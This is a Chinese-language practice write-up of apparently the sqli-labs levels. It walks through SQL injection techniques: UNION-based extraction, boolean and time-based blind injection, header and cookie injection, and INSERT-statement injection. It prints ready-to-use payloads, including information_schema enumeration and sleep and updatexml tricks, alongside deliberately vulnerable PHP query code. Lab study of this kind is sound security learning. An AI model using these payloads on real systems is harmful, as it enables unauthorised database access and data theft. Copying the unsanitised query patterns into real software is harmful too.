## 1-6

有直接的显错以及回显,熟悉一下 SQL injection 的基本套路：

编码， union联合select， mysql 的结构

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
        ...
        //输出结果
  	}
	else 
	{
        //回显错误
        print_r(mysql_error());
        ...
	}
```

1. use for test

?id=0' union select 1,2,3#

?id=0%27%20union%20select%201,2,3%23



2. concat and concat_ws

?id=0' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())#

?id=0%27%20union%20select%201,2,concat_ws(char(32,58,32),user(),database(),version())%23

回显 Your Password:root@localhost : security : 10.1.19-MariaDB


user():返回当前数据库连接使用的用户

database():返回当前数据库连接使用的数据库

version():返回当前数据库的版本



3. select tables test

select table_name from information_schema.tables where table_schema=0x7365637572697479

?id=0' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1#

?id=0' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1#

?id=0' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 2,1#

4. select user tables

>Get databases
?id=0' union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1#



## 7-10

没有回显的情况下，如何使用bool型盲注与时间盲注。

1. substr

select substr(database(),1,1);

select ascii(substr(database(),1,1));


2. bool injection

?id=1′ AND ascii(substr((select database()) ,3,3)) = 99 #

true:: ?id=1%27%20AND%20ascii(substr((select%20database())%20,3,3))%20=%2099%23

false: ?id=1%27%20AND%20ascii(substr((select%20database())%20,3,3))%20=%2098%23


3. time based

true:
?id=1' and if(ascii(substr((select database()) ,3,3)) = 99,0,sleep(10)) #
false sleep 10 sec:
?id=1' and if(ascii(substr((select database()) ,3,3)) = 98,0,sleep(10)) #


## 11-17

从get变成了post，参数油一个变成了2个，没有什么特别大的区别

## 18-20

新的内容，HTTP 头注入,cookie注入

```
$uname = check_input($_POST['uname']);	$passwd = check_input($_POST['passwd']); //输入进行了过滤

$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
//但是insert语句中的uagent 与IP没有进行判断，所以可以注入


```

```
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (",updatexml(0,concat(0x2b5e,database()),0),',')#。
```

同理 cookie 
```
isset($_COOKIE['uname'])

$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
//虽然输入过滤了，但是对cookie没有过滤
```

## 21，22 跑不起来

## 附 在insert update 语句中注入

``` insert into users (id, username, password) values (2,''inject here'','Olivia'); ```

